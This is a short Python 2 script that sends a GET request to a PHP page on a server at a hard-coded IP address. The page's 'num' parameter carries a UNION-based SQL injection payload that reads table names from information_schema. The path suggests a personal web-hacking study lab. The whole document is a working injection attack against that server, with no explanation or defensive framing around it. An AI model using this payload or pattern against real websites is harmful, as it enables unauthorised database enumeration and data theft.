import requests

url = "http://203.229.206.22/~wing608/webstudy/att/04/ver03/pages/read.php"

data = {"num" : "1 union select 1,2,table_name,4,5,6 from information_schema.tables limit 1,1#"}

res = requests.get(url,params=data)

print res.text